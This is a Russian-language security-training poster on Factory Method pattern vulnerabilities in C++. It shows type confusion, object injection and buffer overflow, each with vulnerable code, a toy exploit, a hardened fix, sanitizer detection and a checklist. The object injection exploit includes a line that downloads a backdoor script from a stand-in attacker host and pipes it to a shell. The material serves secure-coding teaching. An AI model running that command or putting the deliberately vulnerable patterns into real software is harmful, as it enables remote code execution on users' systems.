# 🛡️ Security Poster: Factory Method Pattern

## 🎯 Обзор угроз Factory Method Pattern

```
┌────────────────────────────────────────────────────────────────────┐
│           КРИТИЧЕСКИЕ УЯЗВИМОСТИ FACTORY METHOD PATTERN            │
└────────────────────────────────────────────────────────────────────┘

🔴 КРИТИЧНЫЕ УГРОЗЫ:
┌─────────────────────┬──────────────────────────────────────────────┐
│ Type Confusion      │ CWE-843: Incorrect downcast после create()   │
│                     │ Impact: Memory corruption, RCE               │
├─────────────────────┼──────────────────────────────────────────────┤
│ Object Injection    │ Malicious object creation via factory        │
│                     │ Impact: Code execution, privilege escalation │
├─────────────────────┼──────────────────────────────────────────────┤
│ Buffer Overflow     │ CWE-120: Unchecked buffer allocation         │
│                     │ Impact: Heap overflow, RCE                   │
└─────────────────────┴──────────────────────────────────────────────┘

🟡 ВЫСОКИЕ УГРОЗЫ:
┌─────────────────────┬──────────────────────────────────────────────┐
│ Memory Leaks        │ CWE-401: Factory не возвращает ownership     │
│ Integer Overflow    │ Size calculation в object creation           │
│ Unvalidated Input   │ Factory создает объекты из untrusted data    │
└─────────────────────┴──────────────────────────────────────────────┘
```

## 💣 Критическая уязвимость #1: Type Confusion

### Анатомия атаки

```cpp
// ❌ УЯЗВИМЫЙ КОД - Unsafe downcasting после factory
class Product {
public:
    virtual ~Product() = default;
    virtual void use() = 0;
};

class ConcreteProductA : public Product {
public:
    void use() override { /* ... */ }
    void specificMethodA() { /* ... */ }
};

class Factory {
public:
    virtual Product* createProduct() = 0;
};

class ConcreteFactoryA : public Factory {
public:
    Product* createProduct() override {
        return new ConcreteProductA();  // ⚠️ Returns base pointer
    }
};

// УЯЗВИМОЕ ИСПОЛЬЗОВАНИЕ
void vulnerableUsage(Factory* factory) {
    Product* product = factory->createProduct();
    
    // ⚠️ ОПАСНО: Unsafe downcast без проверки типа
    auto* concrete = static_cast<ConcreteProductA*>(product);
    concrete->specificMethodA();  // 💥 Type confusion if wrong type!
}
```

### 🎯 Exploitation: Malicious factory injection

```cpp
// ЭКСПЛОЙТ: Malicious factory подменяет тип
class AttackerProduct : public Product {
public:
    // Memory layout имитирует ConcreteProductA
    char padding[64];
    void (*malicious_function)(void*);
    
    AttackerProduct() {
        malicious_function = (void(*)(void*))0xdeadbeef;  // Shellcode
    }
    
    void use() override { /* Harmless */ }
};

class MaliciousFactory : public Factory {
public:
    Product* createProduct() override {
        return new AttackerProduct();  // ⚠️ Returns wrong type!
    }
};

void exploit() {
    Factory* factory = new MaliciousFactory();
    
    // Жертва думает что получает ConcreteProductA
    Product* product = factory->createProduct();
    
    // Unsafe downcast
    auto* concrete = static_cast<ConcreteProductA*>(product);
    // concrete указывает на AttackerProduct!
    
    // Вызов specificMethodA() читает malicious_function
    concrete->specificMethodA();
    // 💥 Переход на 0xdeadbeef → RCE!
}
```

### ✅ Защита: Type-safe factory с dynamic_cast

```cpp
// ✅ БЕЗОПАСНЫЙ КОД - Type-safe factory
class SafeFactory {
public:
    virtual std::unique_ptr<Product> createProduct() = 0;
};

class SafeConcreteFactory : public SafeFactory {
public:
    std::unique_ptr<Product> createProduct() override {
        return std::make_unique<ConcreteProductA>();
    }
};

void safeUsage(SafeFactory& factory) {
    auto product = factory.createProduct();
    
    // ✅ Safe downcast с проверкой типа
    if (auto* concrete = dynamic_cast<ConcreteProductA*>(product.get())) {
        concrete->specificMethodA();  // Безопасно
    } else {
        throw std::runtime_error("Unexpected product type");
    }
}

// Еще лучше: Type-safe factory с template
template<typename T>
class TypedFactory {
public:
    virtual std::unique_ptr<T> createProduct() = 0;
};

class TypeSafeConcreteFactory : public TypedFactory<ConcreteProductA> {
public:
    std::unique_ptr<ConcreteProductA> createProduct() override {
        return std::make_unique<ConcreteProductA>();
        // ✅ Compile-time type safety!
    }
};
```

## 💣 Критическая уязвимость #2: Object Injection

### Анатомия атаки

```cpp
// ❌ УЯЗВИМЫЙ КОД - Factory создает объекты по string ID
class ObjectFactory {
private:
    std::map<std::string, std::function<Product*()>> registry_;
    
public:
    void registerProduct(const std::string& id, 
                        std::function<Product*()> creator) {
        registry_[id] = creator;  // ⚠️ No validation!
    }
    
    Product* create(const std::string& id) {
        auto it = registry_.find(id);
        if (it != registry_.end()) {
            return it->second();  // ⚠️ Creates ANY registered object!
        }
        return nullptr;
    }
};

// Легитимное использование
objectFactory.registerProduct("safe", []() { return new SafeProduct(); });

// АТАКА: Registration malicious object
objectFactory.registerProduct("malicious", []() { 
    return new MaliciousProduct();  // 💥
});
```

### 🎯 Exploitation: Deserialization gadget chain

```cpp
// ЭКСПЛОЙТ: Object injection через factory
class MaliciousProduct : public Product {
public:
    MaliciousProduct() {
        // Выполняется при создании объекта
        system("wget http://attacker.com/backdoor.sh | sh");
        // 💥 RCE!
    }
    
    void use() override {
        // Дополнительные malicious actions
        exfiltrateData();
    }
};

void exploit_object_injection() {
    ObjectFactory factory;
    
    // Предполагаем что attacker может контролировать registry
    // (через config file, environment variable, database, etc.)
    
    factory.registerProduct("malicious", []() {
        return new MaliciousProduct();
    });
    
    // Жертва создает объект по ID из untrusted source
    std::string user_input = getUntrustedInput();  // "malicious"
    
    Product* product = factory.create(user_input);
    // 💥 MaliciousProduct created → RCE in constructor!
    
    product->use();
    // 💥 Additional malicious actions
}
```

### ✅ Защита: Whitelist-based factory

```cpp
// ✅ БЕЗОПАСНЫЙ КОД - Whitelist validation
class SecureObjectFactory {
private:
    std::map<std::string, std::function<std::unique_ptr<Product>()>> registry_;
    
    // Whitelist разрешенных product IDs
    static const std::set<std::string> ALLOWED_PRODUCTS;
    
public:
    void registerProduct(const std::string& id,
                        std::function<std::unique_ptr<Product>()> creator) {
        // ✅ Validate against whitelist
        if (ALLOWED_PRODUCTS.find(id) == ALLOWED_PRODUCTS.end()) {
            throw SecurityException("Product ID not whitelisted: " + id);
        }
        
        registry_[id] = creator;
    }
    
    std::unique_ptr<Product> create(const std::string& id) {
        // ✅ Double-check whitelist
        if (ALLOWED_PRODUCTS.find(id) == ALLOWED_PRODUCTS.end()) {
            throw SecurityException("Invalid product ID: " + id);
        }
        
        auto it = registry_.find(id);
        if (it != registry_.end()) {
            // ✅ Audit log
            logProductCreation(id);
            return it->second();
        }
        
        return nullptr;
    }
};

const std::set<std::string> SecureObjectFactory::ALLOWED_PRODUCTS = {
    "product_a",
    "product_b",
    "product_c"
    // ТОЛЬКО safe products в whitelist
};

// Альтернатива: Enum-based factory (compile-time safety)
enum class ProductType {
    PRODUCT_A,
    PRODUCT_B,
    PRODUCT_C
};

class EnumBasedFactory {
public:
    std::unique_ptr<Product> create(ProductType type) {
        switch (type) {
            case ProductType::PRODUCT_A:
                return std::make_unique<ConcreteProductA>();
            case ProductType::PRODUCT_B:
                return std::make_unique<ConcreteProductB>();
            case ProductType::PRODUCT_C:
                return std::make_unique<ConcreteProductC>();
            default:
                throw std::runtime_error("Unknown product type");
        }
        // ✅ No injection possible (compile-time validation)
    }
};
```

## 💣 Критическая уязвимость #3: Buffer Overflow в Object Creation

### Анатомия атаки

```cpp
// ❌ УЯЗВИМЫЙ КОД - Unchecked size в factory
class BufferProduct : public Product {
    char* buffer_;
    size_t size_;
    
public:
    BufferProduct(size_t size) : size_(size) {
        buffer_ = new char[size];  // ⚠️ No validation!
    }
    
    ~BufferProduct() { delete[] buffer_; }
    
    void use() override {
        // Работает с buffer_
    }
};

class BufferFactory : public Factory {
public:
    Product* createProduct(size_t size) {
        return new BufferProduct(size);  // ⚠️ size from untrusted source!
    }
};
```

### 🎯 Exploitation: Integer overflow → heap overflow

```cpp
// ЭКСПЛОЙТ: Integer overflow в size calculation
void exploit_buffer_overflow() {
    BufferFactory factory;
    
    // АТАКА 1: Integer overflow
    size_t malicious_size = SIZE_MAX - 10;
    // new char[SIZE_MAX - 10] может overflow в allocation
    // или allocate huge buffer
    
    Product* product = factory.createProduct(malicious_size);
    // Возможные результаты:
    // 1. Allocation fails → DoS
    // 2. Small buffer allocated due to overflow → heap overflow later
    // 3. OOM → DoS
    
    // АТАКА 2: Heap spray через repeated allocations
    std::vector<Product*> products;
    for (int i = 0; i < 100000; ++i) {
        products.push_back(factory.createProduct(1024 * 1024));  // 1MB each
        // 100,000 * 1MB = 100GB
        // 💥 Memory exhaustion → DoS
    }
}
```

### ✅ Защита: Size validation + resource limits

```cpp
// ✅ БЕЗОПАСНЫЙ КОД - Validated allocation
class SecureBufferProduct : public Product {
    std::vector<char> buffer_;  // ✅ RAII container
    
public:
    SecureBufferProduct(size_t size) {
        // ✅ Validation
        const size_t MAX_BUFFER_SIZE = 10 * 1024 * 1024;  // 10MB
        
        if (size == 0) {
            throw std::invalid_argument("Size cannot be zero");
        }
        
        if (size > MAX_BUFFER_SIZE) {
            throw std::invalid_argument(
                "Size exceeds maximum: " + std::to_string(MAX_BUFFER_SIZE)
            );
        }
        
        // ✅ Check for multiplication overflow
        if (size > SIZE_MAX / sizeof(char)) {
            throw std::invalid_argument("Size would cause overflow");
        }
        
        buffer_.resize(size);  // Exception-safe allocation
    }
    
    void use() override { /* ... */ }
};

class SecureBufferFactory : public Factory {
private:
    std::atomic<size_t> total_allocated_{0};
    const size_t MAX_TOTAL_ALLOCATION = 100 * 1024 * 1024;  // 100MB
    
public:
    std::unique_ptr<Product> createProduct(size_t size) {
        // ✅ Global resource limit
        size_t current_total = total_allocated_.fetch_add(size);
        
        if (current_total + size > MAX_TOTAL_ALLOCATION) {
            total_allocated_.fetch_sub(size);  // Rollback
            throw std::runtime_error("Total allocation limit exceeded");
        }
        
        try {
            return std::make_unique<SecureBufferProduct>(size);
        } catch (...) {
            total_allocated_.fetch_sub(size);  // Rollback on failure
            throw;
        }
    }
};
```

## 🛠️ Инструменты детектирования

### 1. UBSan - Type Confusion Detection

```bash
g++ -fsanitize=undefined -g factory_vulnerabilities.cpp -o factory_ubsan

./factory_ubsan
```

**Вывод UBSan**:
```
factory.cpp:45:12: runtime error: downcast of address 0x602000000010 
which does not point to an object of type 'ConcreteProductA'
0x602000000010: note: object is of type 'AttackerProduct'
```

### 2. ASan - Buffer Overflow Detection

```bash
g++ -fsanitize=address -g factory_vulnerabilities.cpp -o factory_asan

./factory_asan
```

**Вывод ASan**:
```
=================================================================
==12345==ERROR: AddressSanitizer: heap-buffer-overflow
WRITE of size 8 at 0x602000000010 thread T0
    #0 0x400b12 in BufferProduct::use() factory.cpp:78
```

### 3. Static Analysis - Clang-Tidy

```bash
clang-tidy factory_vulnerabilities.cpp \
    -checks='cppcoreguidelines-pro-type-static-cast-downcast'

# Warning: do not use static_cast to downcast; use dynamic_cast
```

## 📋 Security Checklist для Factory Method

### Design Phase
```
[ ] Определен ownership model (кто владеет созданными объектами)
[ ] Документированы допустимые product types
[ ] Рассмотрены risks для object injection
[ ] Определены resource limits
```

### Implementation Phase
```
[ ] Используется std::unique_ptr для ownership
[ ] Нет unsafe downcasting (используйте dynamic_cast)
[ ] Whitelist validation для product types
[ ] Size/resource validation перед allocation
[ ] Exception-safe object creation
[ ] Type-safe registry (enum или template)
```

### Testing Phase
```
[ ] Type confusion tests с UBSan
[ ] Buffer overflow tests с ASan
[ ] Object injection tests (malformed input)
[ ] Memory leak tests с Valgrind
[ ] Integer overflow tests
[ ] Fuzzing для factory input
```

### Deployment Phase
```
[ ] Logging для object creation (audit trail)
[ ] Monitoring для resource usage
[ ] Rate limiting для factory calls
[ ] Configuration validation
```

## 🎓 Best Practices

### 1. Type-Safe Factory с std::variant

```cpp
// ✅ Type-safe factory с std::variant (C++17)
using Product = std::variant<ConcreteProductA, ConcreteProductB>;

class VariantFactory {
public:
    Product createProduct(ProductType type) {
        switch (type) {
            case ProductType::A:
                return ConcreteProductA{};
            case ProductType::B:
                return ConcreteProductB{};
        }
        // ✅ Compile-time type safety
    }
};

void usage(VariantFactory& factory) {
    Product product = factory.createProduct(ProductType::A);
    
    // ✅ Type-safe visitation
    std::visit([](auto&& p) {
        p.use();
    }, product);
}
```

### 2. Dependency Injection Factory

```cpp
// ✅ Factory с explicit dependencies
class DIFactory {
    Logger& logger_;
    Config& config_;
    
public:
    DIFactory(Logger& logger, Config& config)
        : logger_(logger), config_(config) {}
    
    std::unique_ptr<Product> createProduct() {
        logger_.log("Creating product");
        
        // Создаем с validated config
        if (!config_.isValid()) {
            throw ConfigException("Invalid config");
        }
        
        return std::make_unique<ConcreteProduct>(config_);
    }
};
```

### 3. Object Pool Factory (для performance)

```cpp
// ✅ Factory с object pooling
class PooledFactory {
    std::queue<std::unique_ptr<Product>> pool_;
    std::mutex mutex_;
    
public:
    std::unique_ptr<Product> createProduct() {
        std::lock_guard lock(mutex_);
        
        if (!pool_.empty()) {
            auto product = std::move(pool_.front());
            pool_.pop();
            return product;  // ✅ Reuse from pool
        }
        
        return std::make_unique<ConcreteProduct>();  // ✅ Create new
    }
    
    void returnProduct(std::unique_ptr<Product> product) {
        std::lock_guard lock(mutex_);
        pool_.push(std::move(product));  // Return to pool
    }
};
```

## 🚨 CVE Examples

```
┌────────────────────────────────────────────────────────────────┐
│        ИЗВЕСТНЫЕ CVE С FACTORY METHOD VULNERABILITIES          │
└────────────────────────────────────────────────────────────────┘

CVE-2017-5638 (Apache Struts 2)
├─ Тип: Object injection через Content-Type parsing
├─ CVSS: 10.0 (CRITICAL)
├─ Impact: RCE через malicious object creation
└─ Причина: Factory создает объекты из unvalidated headers

CVE-2019-12384 (Jackson Databind)
├─ Тип: Polymorphic deserialization → RCE
├─ CVSS: 9.8 (CRITICAL)
├─ Impact: RCE через malicious type specification
└─ Причина: Factory создает arbitrary types from JSON

CVE-2015-7501 (JBoss)
├─ Тип: Java deserialization RCE
├─ CVSS: 9.8 (CRITICAL)
├─ Impact: RCE through object factory abuse
└─ Причина: Unvalidated object creation in factory
```

## 📚 Дополнительные ресурсы

### Стандарты
- **CWE-843**: Access of Resource Using Incompatible Type
- **CWE-502**: Deserialization of Untrusted Data
- **CWE-120**: Buffer Overflow
- **CWE-190**: Integer Overflow

### Книги
- "Design Patterns" - Gang of Four
- "Effective C++" - Scott Meyers
- "Secure Coding in C and C++" - Robert Seacord

## 💡 Золотое правило Factory Security

```
┌────────────────────────────────────────────────────────────────┐
│                                                                │
│  "Factory создает объекты - validate ВСЕ inputs.              │
│   Используйте whitelist для product types.                    │
│   Валидируйте sizes и resources ПЕРЕД allocation.             │
│   Используйте smart pointers для ownership."                  │
│                                                                │
│  Никогда не создавайте объекты из untrusted data без          │
│  whitelist validation и type checking!                         │
│                                                                │
└────────────────────────────────────────────────────────────────┘
```

---

**Версия**: 1.0  
**Дата**: 2025-10-11  
**Курс**: Patterns (Security Integration Track)  
**Лицензия**: MIT

